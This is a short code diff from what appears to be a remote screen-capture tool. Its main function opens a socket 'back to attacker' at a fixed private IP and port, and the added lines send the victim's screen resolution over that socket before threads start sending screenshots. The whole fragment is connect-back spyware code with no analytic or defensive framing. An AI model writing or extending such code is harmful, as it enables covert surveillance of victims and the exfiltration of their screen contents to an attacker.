@@ -42,6 +42,8 @@ def main(host='192.168.86.204', port=6969):
     ''' connect back to attacker on port'''
     sock = socket.socket()
     sock.connect((host, port))
+    screen_data = '{0}x{1}'.format(screensize[0], screensize[1])
+    sock.send(screen_data.encode('utf-8'))
     try:
         while True:
             thread = Thread(target=retreive_screenshot, args=(sock,))
